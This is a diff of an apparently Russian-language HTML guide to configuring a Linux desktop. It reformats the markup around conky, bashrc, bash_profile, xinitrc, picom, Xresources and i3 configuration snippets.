+            <strong>border_width = 1,</strong>
             <em class=comm>#</em><br>
-            cpu_avg_samples = 2,
+            <strong>cpu_avg_samples = 2,</strong>
             <em class=comm>#</em><br>
-            default_color = 'white',<br>
-            default_outline_color = 'white',<br>
-            default_shade_color = 'white',<br>
-            double_buffer = true,<br>
-            draw_borders = true,<br>
-            draw_graph_borders = true,<br>
-            draw_outline = false,<br>
-            draw_shades = false,<br>
-            extra_newline = false,<br>
-            font = 'DejaVu Sans Mono:size=10',<br>
-            gap_x = 60,<br>
-            gap_y = 60,<br>
-            minimum_height = 5,<br>
-            minimum_width = 5,<br>
-            net_avg_samples = 2,<br>
-            no_buffers = true,<br>
-            out_to_console = false,<br>
-            out_to_ncurses = false,<br>
-            out_to_stderr = false,<br>
-            out_to_x = true,<br>
-            own_window = true,<br>
-            own_window_class = 'Conky',<br>
-            own_window_type = 'override',<br>
-            own_window_transparent = false,<br>
-            own_window_argb_visual = true,<br>
-            own_window_argb_value = 90,<br>
-            show_graph_range = false,<br>
-            show_graph_scale = false,<br>
-            stippled_borders = 0,<br>
-            update_interval = 2,<br>
-            uppercase = false,<br>
-            use_spacer = 'none',<br>
-            use_xft = true, }<br>
-            conky.text = [[<br>
-            ${font DejaVu Sans Mono:size=44}${color green}$alignc${time %H:%M}${font DejaVu Sans Mono:size=15}<br>
-            $alignc${time %a}, ${time %d %b %Y}$font$color<br>
-            # sys<br>
-            ${color gold}SYS ${hr 3}$color<br>
-            ${color green}Ядро:$color $alignr $kernel<br>
-            ${color green}Время _в_сети:$color $alignr $uptime<br>
-            # cpu<br>
-            ${color gold}CPU ${hr 3}$color<br>
-            ${color green}Задействовано:$color $alignr $cpu %<br>
-            ${color green}Частота:$color $alignr $freq MHz<br>
-            ${color green}Температура:$color $alignr ${execi 10 sensors | grep "id 0:" | cut -b15-22}<br>
-            $alignr ${execi 10 sensors | grep "Core 0:" | cut -b1-22 }<br>
-            $alignr ${execi 10 sensors | grep "Core 1:" | cut -b1-22 }<br>
-            $alignr ${execi 10 sensors | grep "Core 2:" | cut -b1-22 }<br>
-            $alignr ${execi 10 sensors | grep "Core 3:" | cut -b1-22 }<br>
-            # gpu<br>
-            ${color gold}GPU ${hr 3}$color<br>
-            ${color green}Частота:$color $alignr ${nvidia gpufreq} Mhz<br>
-            ${color green}Задействовано:$color $alignr ${nvidia mem} / ${nvidia memmax} MiB<br>
-            ${color green}Температура:$color $alignr ${nvidia temp} °C<br>
-            # ram<br>
-            ${color gold}RAM ${hr 3}$color$<br>
-            ${color green}Задействовано:$color $alignr $mem / $memmax<br>
-            ${color green}Свободно:$color $alignr $memeasyfree / $memmax<br>
-            $memperc% ${membar 4}<br>
-            #swap<br>
-            ${color gold}SWAP ${hr 3}$color<br>
-            ${color green}Задействовано:$color $alignr $swap / $swapmax<br>
-            $swapperc% ${swapbar 4}<br>
-            # processes<br>
-            ${color gold}Процессы ${hr 3}$color<br>
-            ${color green}Название $alignr PID | CPU% | MEM% $color<br>
-            ${top name 1} $alignr ${top pid 1}|${top cpu 1}|${top mem 1}<br>
-            ${top name 2} $alignr ${top pid 2}|${top cpu 2}|${top mem 2}<br>
-            ${top name 3} $alignr ${top pid 3}|${top cpu 3}|${top mem 3}<br>
-            ${top name 4} $alignr ${top pid 4}|${top cpu 4}|${top mem 4}<br>
-            ${top name 5} $alignr ${top pid 5}|${top cpu 5}|${top mem 5}<br>
-            ${top name 6} $alignr ${top pid 6}|${top cpu 6}|${top mem 6}<br>
-            ${top name 7} $alignr ${top pid 7}|${top cpu 7}|${top mem 7}<br>
-            ${top name 8} $alignr ${top pid 8}|${top cpu 8}|${top mem 8}<br>
-            ${top name 9} $alignr ${top pid 9}|${top cpu 9}|${top mem 9}<br>
-            # home<br>
-            ${color gold}/home ${hr 3}$color
-            ${color green}Температура:$color $alignr ${execi 10 sensors nvme-pci-0200 | grep "Composite:" | cut -b14-22}<br>
-            ${color green}Задействовано:$color $alignr ${fs_used /home/} / ${fs_size /home/}<br>
-            ${color green}Свободно:$color $alignr ${fs_free /home/} / ${fs_size /home/}<br>
-            (${fs_type /home}) $color${fs_bar 4 /home/}<br>
-            # games<br>
-            ${color gold}/games ${hr 3}$color<br>
-            ${color green}Температура:$color $alignr ${execi 10 sensors nvme-pci-0700 | grep "Composite:" | cut -b14-22}<br>
-            ${color green}Задействовано:$color $alignr ${fs_used /games/} / ${fs_size /games/}<br>
-            ${color green}Свободно:$color $alignr ${fs_free /games/} / ${fs_size /games/}<br>
-            (${fs_type /games}) $color${fs_bar 4 /games/}<br>
-            # data<br>
-            ${color gold}/data ${hr 3}$color<br>
-            ${color green}Задействовано:$color $alignr ${fs_used /data/} / ${fs_size /data/}<br>
-            ${color green}Свободно:$color $alignr ${fs_free /data/} / ${fs_size /data/}<br>
-            (${fs_type /data}) $color${fs_bar 4 /data/}<br>
-            ]]<br>
+            <strong>default_color = 'white',</strong>
+            <em class=comm>#</em><br>
+            <strong>default_outline_color = 'white',</strong>
+            <em class=comm>#</em><br>
+            <strong>default_shade_color = 'white',</strong>
+            <em class=comm>#</em><br>
+            <strong>double_buffer = true,</strong>
+            <em class=comm>#</em><br>
+            <strong>draw_borders = true,</strong>
+            <em class=comm>#</em><br>
+            <strong>draw_graph_borders = true,</strong>
+            <em class=comm>#</em><br>
+            <strong>draw_outline = false,</strong>
+            <em class=comm>#</em><br>
+            <strong>draw_shades = false,</strong>
+            <em class=comm>#</em><br>
+            <strong>extra_newline = false,</strong>
+            <em class=comm>#</em><br>
+            <strong>font = 'DejaVu Sans Mono:size=10',</strong>
+            <em class=comm>#</em><br>
+            <strong>gap_x = 60,</strong>
+            <em class=comm>#</em><br>
+            <strong>gap_y = 60,</strong>
+            <em class=comm>#</em><br>
+            <strong>minimum_height = 5,</strong>
+            <em class=comm>#</em><br>
+            <strong>minimum_width = 5,</strong>
+            <em class=comm>#</em><br>
+            <strong>net_avg_samples = 2,</strong>
+            <em class=comm>#</em><br>
+            <strong>no_buffers = true,</strong>
+            <em class=comm>#</em><br>
+            <strong>out_to_console = false,</strong>
+            <em class=comm>#</em><br>
+            <strong>out_to_ncurses = false,</strong>
+            <em class=comm>#</em><br>
+            <strong>out_to_stderr = false,</strong>
+            <em class=comm>#</em><br>
+            <strong>out_to_x = true,</strong>
+            <em class=comm>#</em><br>
+            <strong>own_window = true,</strong>
+            <em class=comm>#</em><br>
+            <strong>own_window_class = 'Conky',</strong>
+            <em class=comm>#</em><br>
+            <strong>own_window_type = 'override',</strong>
+            <em class=comm>#</em><br>
+            <strong>own_window_transparent = false,</strong>
+            <em class=comm>#</em><br>
+            <strong>own_window_argb_visual = true,</strong>
+            <em class=comm>#</em><br>
+            <strong>own_window_argb_value = 90,</strong>
+            <em class=comm>#</em><br>
+            <strong>show_graph_range = false,</strong>
+            <em class=comm>#</em><br>
+            <strong>show_graph_scale = false,</strong>
+            <em class=comm>#</em><br>
+            <strong>stippled_borders = 0,</strong>
+            <em class=comm>#</em><br>
+            <strong>update_interval = 2,</strong>
+            <em class=comm>#</em><br>
+            <strong>uppercase = false,</strong>
+            <em class=comm>#</em><br>
+            <strong>use_spacer = 'none',</strong>
+            <em class=comm>#</em><br>
+            <strong>use_xft = true, }</strong>
+            <em class=comm>#</em><br>
+            <strong>conky.text = [[</strong>
+            <em class=comm>#</em><br>
+            <strong>${font DejaVu Sans Mono:size=44}${color green}$alignc${time %H:%M}${font DejaVu Sans Mono:size=15}</strong>
+            <em class=comm>#</em><br>
+            <strong>$alignc${time %a}, ${time %d %b %Y}$font$color</strong>
+            <em class=comm>#</em><br>
+            <strong>#sys</strong><br>
+            <strong>${color gold}SYS ${hr 3}$color</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Ядро:$color $alignr $kernel</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Время _в_сети:$color $alignr $uptime</strong>
+            <em class=comm>#</em><br>
+            <strong>#cpu</strong><br>
+            <strong>${color gold}CPU ${hr 3}$color</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Задействовано:$color $alignr $cpu %</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Частота:$color $alignr $freq MHz</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Температура:$color $alignr ${execi 10 sensors | grep "id 0:" | cut -b15-22}</strong>
+            <em class=comm>#</em><br>
+            <strong>$alignr ${execi 10 sensors | grep "Core 0:" | cut -b1-22 }</strong>
+            <em class=comm>#</em><br>
+            <strong>$alignr ${execi 10 sensors | grep "Core 1:" | cut -b1-22 }</strong>
+            <em class=comm>#</em><br>
+            <strong>$alignr ${execi 10 sensors | grep "Core 2:" | cut -b1-22 }</strong>
+            <em class=comm>#</em><br>
+            <strong>$alignr ${execi 10 sensors | grep "Core 3:" | cut -b1-22 }</strong>
+            <em class=comm>#</em><br>
+            <strong>#gpu</strong><br>
+            <strong>${color gold}GPU ${hr 3}$color</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Частота:$color $alignr ${nvidia gpufreq} Mhz</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Задействовано:$color $alignr ${nvidia mem} / ${nvidia memmax} MiB</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Температура:$color $alignr ${nvidia temp} °C</strong>
+            <em class=comm>#</em><br>
+            <strong>#ram</strong><br>
+            <strong>${color gold}RAM ${hr 3}$color$</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Задействовано:$color $alignr $mem / $memmax</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Свободно:$color $alignr $memeasyfree / $memmax</strong>
+            <em class=comm>#</em><br>
+            <strong>$memperc% ${membar 4}</strong>
+            <em class=comm>#</em><br>
+            <strong>#swap</strong><br>
+            <strong>${color gold}SWAP ${hr 3}$color</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Задействовано:$color $alignr $swap / $swapmax</strong>
+            <em class=comm>#</em><br>
+            <strong>$swapperc% ${swapbar 4}</strong>
+            <em class=comm>#</em><br>
+            <strong>#processes</strong><br>
+            <strong>${color gold}Процессы ${hr 3}$color</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Название $alignr PID | CPU% | MEM% $color</strong>
+            <em class=comm>#</em><br>
+            <strong>${top name 1} $alignr ${top pid 1}|${top cpu 1}|${top mem 1}</strong>
+            <em class=comm>#</em><br>
+            <strong>${top name 2} $alignr ${top pid 2}|${top cpu 2}|${top mem 2}</strong>
+            <em class=comm>#</em><br>
+            <strong>${top name 3} $alignr ${top pid 3}|${top cpu 3}|${top mem 3}</strong>
+            <em class=comm>#</em><br>
+            <strong>${top name 4} $alignr ${top pid 4}|${top cpu 4}|${top mem 4}</strong>
+            <em class=comm>#</em><br>
+            <strong>${top name 5} $alignr ${top pid 5}|${top cpu 5}|${top mem 5}</strong>
+            <em class=comm>#</em><br>
+            <strong>${top name 6} $alignr ${top pid 6}|${top cpu 6}|${top mem 6}</strong>
+            <em class=comm>#</em><br>
+            <strong>${top name 7} $alignr ${top pid 7}|${top cpu 7}|${top mem 7}</strong>
+            <em class=comm>#</em><br>
+            <strong>${top name 8} $alignr ${top pid 8}|${top cpu 8}|${top mem 8}</strong>
+            <em class=comm>#</em><br>
+            <strong>${top name 9} $alignr ${top pid 9}|${top cpu 9}|${top mem 9}</strong>
+            <em class=comm>#</em><br>
+            <strong>#home</strong><br>
+            <strong>${color gold}/home ${hr 3}$color</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Температура:$color $alignr ${execi 10 sensors nvme-pci-0200 | grep "Composite:" | cut -b14-22}</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Задействовано:$color $alignr ${fs_used /home/} / ${fs_size /home/}</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Свободно:$color $alignr ${fs_free /home/} / ${fs_size /home/}</strong>
+            <em class=comm>#</em><br>
+            <strong>(${fs_type /home}) $color${fs_bar 4 /home/}</strong>
+            <em class=comm>#</em><br>
+            <strong>#games</strong><br>
+            <strong>${color gold}/games ${hr 3}$color</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Температура:$color $alignr ${execi 10 sensors nvme-pci-0700 | grep "Composite:" | cut -b14-22}</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Задействовано:$color $alignr ${fs_used /games/} / ${fs_size /games/}</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Свободно:$color $alignr ${fs_free /games/} / ${fs_size /games/}</strong>
+            <em class=comm>#</em><br>
+            <strong>(${fs_type /games}) $color${fs_bar 4 /games/}</strong>
+            <em class=comm>#</em><br>
+            <strong>#data</strong><br>
+            <strong>${color gold}/data ${hr 3}$color</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Задействовано:$color $alignr ${fs_used /data/} / ${fs_size /data/}</strong>
+            <em class=comm>#</em><br>
+            <strong>${color green}Свободно:$color $alignr ${fs_free /data/} / ${fs_size /data/}</strong>
+            <em class=comm>#</em><br>
+            <strong>(${fs_type /data}) $color${fs_bar 4 /data/}</strong>
+            <em class=comm>#</em><br>
+            <strong>]]</strong><br>
           </p>
         </td>
       </tr>
@@ -3212,7 +3622,9 @@
       <tr>
         <td>
           <p class=term>
-            nano ~/.bashrc<em class=comm>#</em>
+            <em class=ps1>usert@pc~$</em>
+            <strong>nano ~/.bashrc</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3224,39 +3636,68 @@
       <tr>
         <td>
           <p class=term>
-            #<br>
-            # ~/.bashrc<br>
-            #<br>
-            # If not running interactively, don't do anything  <br>
-            [[ $- != *i* ]] && return                          <br>
-            alias grep="grep --color=auto"                     <br>
-            alias ip="ip --color=auto"                         <br>
-            if [ -f /usr/bin/grc ]; then                       <br>
-            alias irclog="grc --colour=auto irclog"            <br>
-            alias log="grc --colour=auto log"                  <br>
-            alias configure="grc --colour=auto configure"      <br>
-            alias ping="grc --colour=auto ping"                <br>
-            alias traceroute="grc --colour=auto traceroute"    <br>
-            alias gcc="grc --colour=auto gcc"                  <br>
-            alias netstat="grc --colour=auto netstat"          <br>
-            alias diff="grc --colour=auto diff"                <br>
-            alias wdiff="grc --colour=auto wdiff"              <br>
-            alias log="grc --colour=auto log"                  <br>
-            alias ldap="grc --colour=auto ldap"                <br>
-            alias cvs="grc --colour=auto cvs"                  <br>
-            alias mount="grc --colour=auto mount"              <br>
-            alias mtr="grc --colour=auto mtr"                  <br>
-            alias ps="grc --colour=auto ps"                    <br>
-            alias dig="grc --colour=auto dig"                  <br>
-            alias ifconfig="grc --colour=auto ifconfig"        <br>
-            alias ls="grc --colour=auto ls"                    <br>
-            alias mount="grc --colour=auto mount"              <br>
-            alias df="grc --colour=auto df"                    <br>
-            fi                                                 <br>
-            PS1="\[\e[3;31m\][\A] [\u@\h \W]\$: \[\e[0m\]"     <br>
-            export HISTCONTROL="ignoredups"                    <br>
-            export TERM="xterm-256color"                       <br>
-            export LESS="-R --use-color-Dd+r$Du+b"             <br>
+            <strong>#</strong><br>
+            <strong># ~/.bashrc</strong><br>
+            <strong>#</strong><br>
+            <strong># If not running interactively, don't do anything</strong><br>
+            <strong>[[ $- != *i* ]] && return</strong>
+            <em class=comm>#</em><br>
+            <strong>alias grep="grep --color=auto"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias ip="ip --color=auto"</strong>
+            <em class=comm>#</em><br>
+            <strong>if [ -f /usr/bin/grc ]; then</strong>
+            <em class=comm>#</em><br>
+            <strong>alias irclog="grc --colour=auto irclog"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias log="grc --colour=auto log"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias configure="grc --colour=auto configure"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias ping="grc --colour=auto ping"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias traceroute="grc --colour=auto traceroute"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias gcc="grc --colour=auto gcc"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias netstat="grc --colour=auto netstat"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias diff="grc --colour=auto diff"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias wdiff="grc --colour=auto wdiff"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias log="grc --colour=auto log"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias ldap="grc --colour=auto ldap"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias cvs="grc --colour=auto cvs"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias mount="grc --colour=auto mount"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias mtr="grc --colour=auto mtr"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias ps="grc --colour=auto ps"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias dig="grc --colour=auto dig"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias ifconfig="grc --colour=auto ifconfig"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias ls="grc --colour=auto ls"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias mount="grc --colour=auto mount"</strong>
+            <em class=comm>#</em><br>
+            <strong>alias df="grc --colour=auto df"</strong>
+            <em class=comm>#</em><br>
+            <strong>fi</strong>
+            <em class=comm>#</em><br>
+            <strong>PS1="\[\e[3;31m\][\A] [\u@\h \W]\$: \[\e[0m\]"</strong>
+            <em class=comm>#</em><br>
+            <strong>export HISTCONTROL="ignoredups"</strong>
+            <em class=comm>#</em><br>
+            <strong>export TERM="xterm-256color"</strong>
+            <em class=comm>#</em><br>
+            <strong>export LESS="-R --use-color-Dd+r$Du+b"</strong>
+            <em class=comm>#</em><br>
           </p>
         </td>
       </tr>
@@ -3284,7 +3725,9 @@
       <tr>
         <td>
           <p class=term>
-            cp /etc/skel/.bash_profile ~/.bash_profile<em class=comm>#</em>
+            <em class=ps1>usert@pc~$</em>
+            <strong>cp /etc/skel/.bash_profile ~/.bash_profile</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3296,7 +3739,9 @@
       <tr>
         <td>
           <p class=term>
-            nano ~/.bash_profile<em class=comm>#</em>
+            <em class=ps1>usert@pc~$</em>
+            <strong>nano ~/.bash_profile</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3308,12 +3753,18 @@
       <tr>
         <td>
           <p class=term>
-            # <br>
-            # ~/.bash_profile <br>
-            # <br>
-            setleds -D +num <br>
-            [[ -f ~/.bashrc ]] && . ~/.bashrc <br>
-            [[ -z $DISPLAY && $XDG_VTNR -eq 1 ]] && exec startx  <br>
+            <strong>#</strong>
+            <em class=comm>#</em><br>
+            <strong># ~/.bash_profile</strong>
+            <em class=comm>#</em><br>
+            <strong>#</strong>
+            <em class=comm>#</em><br>
+            <strong>setleds -D +num</strong>
+            <em class=comm>#</em><br>
+            <strong>[[ -f ~/.bashrc ]] && . ~/.bashrc</strong>
+            <em class=comm>#</em><br>
+            <strong>[[ -z $DISPLAY && $XDG_VTNR -eq 1 ]] && exec startx</strong>
+            <em class=comm>#</em><br>
           </p>
         </td>
       </tr>
@@ -3346,7 +3797,9 @@
       <tr>
         <td>
           <p class=term>
-            cp /etc/X11/xinit/xinitrc ~/.xinitrc<em class=comm>#</em>
+            <em class=ps1>usert@pc~$</em>
+            <strong>cp /etc/X11/xinit/xinitrc ~/.xinitrc</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3358,7 +3811,9 @@
       <tr>
         <td>
           <p class=term>
-            nano ~/.xinitrc<em class=comm>#</em>
+            <em class=ps1>usert@pc~$</em>
+            <strong>nano ~/.xinitrc</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3370,43 +3825,79 @@
       <tr>
         <td>
           <p class=term>
-            #!/bin/sh<br>
-            userresources=$HOME/.Xresources<br>
-            usermodmap=$HOME/.Xmodmap<br>
-            sysresources=/etc/X11/xinit/.Xresources<br>
-            sysmodmap=/etc/X11/xinit/.Xmodmap<br>
-            # merge in defaults and keymaps<br>
-            if [ -f $sysresources ]; then<br>
-            xrdb -merge $sysresources<br>
-            fi<br>
-            if [ -f $sysmodmap ]; then<br>
-            xmodmap $sysmodmap<br>
-            fi<br>
-            if [ -f "$userresources" ]; then<br>
-            xrdb -merge "$userresources"<br>
-            fi<br>
-            if [ -f "$usermodmap" ]; then<br>
-            xmodmap "$usermodmap"<br>
-            fi<br>
-            # start some nice programs<br>
-            if [ -d /etc/X11/xinit/xinitrc.d ] ; then<br>
-            for f in /etc/X11/xinit/xinitrc.d/?*.sh ; do<br>
-            [ -x "$f" ] && . "$f"<br>
-            done<br>
-            unset f<br>
-            fi<br>
-            xhost +si:localuser:root<br>
-            volctl &<br>
-            flameshot &<br>
-            copyq &<br>
-            obs &<br>
-            tint2 &<br>
-            devmon &<br>
-            picom -b &<br>
-            sh ~/.fehbg &<br>
-            conky &<br>
-            numlockx &<br>
-            exec i3<br>
+            #!/bin/sh</strong><br>
+            <strong>userresources=$HOME/.Xresources</strong>
+            <em class=comm>#</em><br>
+            <strong>usermodmap=$HOME/.Xmodmap</strong>
+            <em class=comm>#</em><br>
+            <strong>sysresources=/etc/X11/xinit/.Xresources</strong>
+            <em class=comm>#</em><br>
+            <strong>sysmodmap=/etc/X11/xinit/.Xmodmap</strong>
+            <em class=comm>#</em><br>
+            <strong># merge in defaults and keymaps</strong>
+            <em class=comm>#</em><br>
+            <strong>if [ -f $sysresources ]; then</strong>
+            <em class=comm>#</em><br>
+            <strong>xrdb -merge $sysresources</strong>
+            <em class=comm>#</em><br>
+            <strong>fi</strong>
+            <em class=comm>#</em><br>
+            <strong>if [ -f $sysmodmap ]; then</strong>
+            <em class=comm>#</em><br>
+            <strong>xmodmap $sysmodmap</strong>
+            <em class=comm>#</em><br>
+            <strong>fi</strong>
+            <em class=comm>#</em><br>
+            <strong>if [ -f "$userresources" ]; then</strong>
+            <em class=comm>#</em><br>
+            <strong>xrdb -merge "$userresources"</strong>
+            <em class=comm>#</em><br>
+            <strong>fi</strong>
+            <em class=comm>#</em><br>
+            <strong>if [ -f "$usermodmap" ]; then</strong>
+            <em class=comm>#</em><br>
+            <strong>xmodmap "$usermodmap"</strong>
+            <em class=comm>#</em><br>
+            <strong>fi</strong>
+            <em class=comm>#</em><br>
+            <strong># start some nice programs</strong>
+            <em class=comm>#</em><br>
+            <strong>if [ -d /etc/X11/xinit/xinitrc.d ] ; then</strong>
+            <em class=comm>#</em><br>
+            <strong>for f in /etc/X11/xinit/xinitrc.d/?*.sh ; do</strong>
+            <em class=comm>#</em><br>
+            <strong>[ -x "$f" ] && . "$f"</strong>
+            <em class=comm>#</em><br>
+            <strong>done</strong>
+            <em class=comm>#</em><br>
+            <strong>unset f</strong>
+            <em class=comm>#</em><br>
+            <strong>fi</strong>
+            <em class=comm>#</em><br>
+            <strong>xhost +si:localuser:root</strong>
+            <em class=comm>#</em><br>
+            <strong>volctl &</strong>
+            <em class=comm>#</em><br>
+            <strong>flameshot &</strong>
+            <em class=comm>#</em><br>
+            <strong>copyq &</strong>
+            <em class=comm>#</em><br>
+            <strong>obs &</strong>
+            <em class=comm>#</em><br>
+            <strong>tint2 &</strong>
+            <em class=comm>#</em><br>
+            <strong>devmon &</strong>
+            <em class=comm>#</em><br>
+            <strong>picom -b &</strong>
+            <em class=comm>#</em><br>
+            <strong>sh ~/.fehbg &</strong>
+            <em class=comm>#</em><br>
+            <strong>conky &</strong>
+            <em class=comm>#</em><br>
+            <strong>numlockx &</strong>
+            <em class=comm>#</em><br>
+            <strong>exec i3</strong>
+            <em class=comm>#</em><br>
           </p>
         </td>
       </tr>
@@ -3434,7 +3925,9 @@
       <tr>
         <td>
           <p class=term>
-            chmod +x ~/.xinitrc<em class=comm>#</em>
+            <em class=ps1>usert@pc~$</em>
+            <strong>chmod +x ~/.xinitrc</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3446,7 +3939,9 @@
       <tr>
         <td>
           <p class=term>
-            nano ~/.profile<em class=comm>#</em>
+            <em class=ps1>usert@pc~$</em>
+            <strong>nano ~/.profile</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3458,7 +3953,8 @@
       <tr>
         <td>
           <p class=term>
-            export QT_QPA_PLATFORMTHEME="qt6ct"<em class=comm>#</em>
+            <strong>export QT_QPA_PLATFORMTHEME="qt6ct"</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3491,7 +3987,9 @@
       <tr>
         <td>
           <p class=term>
-            feh --bg-scale ПутьКОбоине.jpg<em class=comm>#</em>
+            <em class=ps1>usert@pc~$</em>
+            <strong>feh --bg-scale ПутьКОбоине.jpg</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3503,7 +4001,9 @@
       <tr>
         <td>
           <p class=term>
-            cp /etc/xdg/picom.conf ~/.config/picom.conf<em class=comm>#</em>
+            <em class=ps1>usert@pc~$</em>
+            <strong>cp /etc/xdg/picom.conf ~/.config/picom.conf</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3515,7 +4015,9 @@
       <tr>
         <td>
           <p class=term>
-            nano ~/.config/picom.conf<em class=comm>#</em>
+            <em class=ps1>usert@pc~$</em>
+            <strong>nano ~/.config/picom.conf</strong>
+            <em class=comm>#</em>
           </p>
         </td>
       </tr>
@@ -3527,460 +4029,6 @@
       <tr>
         <td>
           <p class=term>
-            inactive-opacity = 0.6;<em class=comm>исправляем параметры</em><br>
-            frame-opacity = 0.5;<em class=comm>исправляем параметры</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>CTRL</em>
-          <em class=comm>+</em>
-          <em class=button>O</em>
-          <em class=comm>#сохранение_в_nano</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>CTRL</em>
-          <em class=comm>+</em>
-          <em class=button>X</em>
-          <em class=comm>#выход_из_nano</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=text>Настройка внешнего вида xterm</p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            nano ~/.Xresources<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=text>Прописываем</p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            !<br>
-            xterm*highlightSelection: true<br>
-            xterm*trimSelection: true<br>
-            xterm*background: #002b36<br>
-            xterm*foreground: #657b83<br>
-            !<br>
-            xterm*scrollBar: true<br>
-            xterm*scrollbar.width: 8<br>
-            xterm*scrollKey: true<br>
-            xterm*metaSendsEscape: true<br>
-            xterm*rightScrollBar: true<br>
-            !<br>
-            xterm*colorBDMode: true<br>
-            xterm*colorBD: red<br>
-            xterm*colorULMode: true<br>
-            xterm*colorUL: green<br>
-            xterm*veryBoldColors: 6
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>CTRL</em>
-          <em class=comm>+</em>
-          <em class=button>O</em>
-          <em class=comm>#сохранение_в_nano</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>CTRL</em>
-          <em class=comm>+</em>
-          <em class=button>X</em>
-          <em class=comm>#выход_из_nano</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            xrdb -merge ~/.Xresources<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=text>Настройка i3wm</p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            nano ~/.config/i3/config<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            gaps inner 20 <br>
-            gaps outer 4 <br>
-            default_border pixel<br>
-            for_window [tiling] border pixel 5<br>
-            client.focused #657b83 #657b83 #657b83 #657b83<br>
-            exec --no-startup-id /usr/lib/geoclue-2.0/demos/agent
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>CTRL</em>
-          <em class=comm>+</em>
-          <em class=button>O</em>
-          <em class=comm>#сохранение_в_nano</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>CTRL</em>
-          <em class=comm>+</em>
-          <em class=button>X</em>
-          <em class=comm>#выход_из_nano</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            cp /etc/i3status.conf ~/.i3status.conf<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            nano ~/.i3status.conf<em class=comm>#</em>
-          </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            order += "run_watch VPNC" <br>
-            order += "path_exists" <br>
-            order += "wireless _first_" <br>
-            order += "ethernet _first_" <br>
-            order += "battery all" <br>
-            order += "cpu_temperature 0" <br>
-            order += "load" <br>
-            order += "memory" <br>
-            order += "tztime local" <br>
-            order += "volume master" <br>
-            wireless _first_ { format_up = "Wi-Fi: (%quality at %essid) %ip" format_down = "Wi-Fi: down" } <br>
-            ethernet _first_ { format_up = "Rj45: %ip (%speed)" format_down = "Rj45: down" } <br>
